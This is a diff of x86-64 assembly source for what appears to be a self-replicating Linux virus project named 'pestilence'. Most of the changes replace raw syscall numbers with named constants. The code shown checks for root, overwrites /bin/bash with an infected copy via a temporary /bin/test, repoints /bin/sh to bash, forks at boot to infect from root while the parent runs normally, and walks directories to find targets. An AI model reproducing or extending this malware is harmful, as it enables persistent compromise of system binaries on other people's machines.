@@ -1,15 +1,18 @@
+%define OPTIONS_S
+%include "pestilence.lst"
+
 section .text
 	global _start_infect
 	global _infect_from_root
 	global _verify_starting_infect
 	global _famine_start_options
     global _fork_before_exec_normaly
-	extern _final_end
-	extern _string
-	extern _treat_file
-	extern _read_dir
-	extern _continue_normaly
-	extern _verify_o_entry
+;	extern _final_end
+;	extern _string
+;	extern _treat_file
+;	extern _read_dir
+;	extern _continue_normaly
+;	extern _verify_o_entry
 
 ;_rc_local:
 ;    .string db '/etc/rc.local', 0
@@ -28,7 +31,7 @@ _start_infect: ; here we know we will infect only bash, and redirect sh to bash
 	enter 24, 0
 
 ;; Geteuid syscall
-	mov rax, 107
+	mov rax, SYS_GETEUID
 	syscall
 	cmp rax, 0 ; if geteuid return 0, so we are root, and we have largelly right to infect /etc/rc.local
 	jne _ret
@@ -38,18 +41,18 @@ _start_infect: ; here we know we will infect only bash, and redirect sh to bash
 
 ; now /bin/bash is the infected version of /bin/bash
 ; so we unlink /bin/sh
-	mov rax, 87
+	mov rax, SYS_UNLINK
 	lea rdi, [rel _symlink]
 	syscall
 
 ; and then we create our symbolic link: /bin/sh -> /bin/bash
-	mov rax, 88
+	mov rax, SYS_SYMLINK
 	lea rsi, [rel _symlink]
 	lea rdi, [rel _bin_bash]
 	syscall
 
 _exit_properly:
-	mov rax, 60
+	mov rax, SYS_EXIT
 	mov rdi, 0
 	syscall
 
@@ -59,12 +62,12 @@ _ret:
 
 _relink_sh: ; unlink sh, and link it to dash
 ;; unlink sh
-	mov rax, 87
+	mov rax, SYS_UNLINK
 	lea rdi, [rel _symlink]
 	syscall
 
 ;; link sh -> dash
-	mov rax, 88
+	mov rax, SYS_SYMLINK
 	lea rsi, [rel _symlink]
 	lea rdi, [rel _bin_dash]
 	syscall
@@ -116,7 +119,7 @@ _verify_starting_infect:
 
 ;; We are running on boot of the system. So we fork,
 ;; make the child infect from root, and the parent simply exec normaly.
-	mov rax, 57
+	mov rax, SYS_FORK
 	syscall
 	cmp rax, 0
 	jne _relink_sh ;; parent job
@@ -160,7 +163,7 @@ _copy_infect_unlink_rename:
 	enter 280, 0 ; 256(buffer) + 8(fd /bin/bash) + 8(fd /bin/test) + 8(int result of read) + 16(pading)
 
 ; open /bin/bash
-	mov rax, 2
+	mov rax, SYS_OPEN
 	lea rdi, [rel _bin_bash]
 	mov rsi, 0
 	syscall
@@ -171,7 +174,7 @@ _copy_infect_unlink_rename:
 	mov QWORD [rsp + 256], rax
 
 ; open /bin/test
-	mov rax, 2
+	mov rax, SYS_OPEN
 	lea rdi, [rel _new_bash]
 	mov rsi, 578 ; O_RDWR | O_CREAT | O_TRUNC
 	mov rdx, 493 ; S_IRWXU | S_IRGRP | S_IROTH | S_IXGRP | S_IXOTH
@@ -187,7 +190,7 @@ _copy_infect_unlink_rename:
 
 _loop_read_write: ; do {
 ;; read from /bin/bash
-	mov rax, 0
+	mov rax, SYS_READ
 	mov rdi, QWORD [rsp + 256]
 	mov rsi, rsp
 	mov rdx, 256
@@ -196,7 +199,7 @@ _loop_read_write: ; do {
 
 _write_it: ; write the bytes readed to /bin/test
 ;; write to /bin/test
-	mov rax, 1
+	mov rax, SYS_WRITE
 	mov rdi, QWORD [rsp + 264]
 	mov rsi, rsp
 	mov rdx, QWORD [rsp + 272]
@@ -209,10 +212,10 @@ _verify: ; } while (number_bytes_readed == 256)
 
 _unlink:
 ; close /bin/bash and /bin/test
-	mov rax, 3
+	mov rax, SYS_CLOSE
 	mov rdi, QWORD [rsp + 256]
 	syscall
-	mov rax, 3
+	mov rax, SYS_CLOSE
 	mov rdi, QWORD [rsp + 264]
 	syscall
 
@@ -243,14 +246,14 @@ _unlink:
 	pop rdi
 
 ; now we unlink /bin/bash
-	mov rax, 87
+	mov rax, SYS_UNLINK
 	lea rdi, [rel _bin_bash.string]
 	syscall
 	cmp rax, 0
 	jne _exit_copy
 
 ; and we rename /bin/test to /bin/bash
-	mov rax, 82
+	mov rax, SYS_RENAME
 	lea rdi, [rel _new_bash.string]
 	lea rsi, [rel _bin_bash.string]
 	syscall
@@ -297,7 +300,7 @@ _fork_before_infect_root:
 ;; When we infect from root, we always fork the process, run it normally in the parent,
 ;; and infect from root in the child
     ;; fork
-	mov rax, 57
+	mov rax, SYS_FORK
 	syscall
 	cmp rax, 0
     jne _exit_properly ;; parent
@@ -310,7 +313,7 @@ _fork_before_exec_normaly:
 ;; When infecting normaly, we fork the process to run it normally in parent,
 ;; and infect in child
     ;; fork
-	mov rax, 57
+	mov rax, SYS_FORK
 	syscall
 	cmp rax, 0
     jne _verify_o_entry ;; parent
@@ -333,3 +336,5 @@ _fork_before_exec_normaly:
 	mov		BYTE [rsp + 32], 0x32			; add a '2' at the end of the path string
 	call	_read_dir						; call our directory browsing function
 	jmp _exit_properly
+
+%undef OPTIONS_S
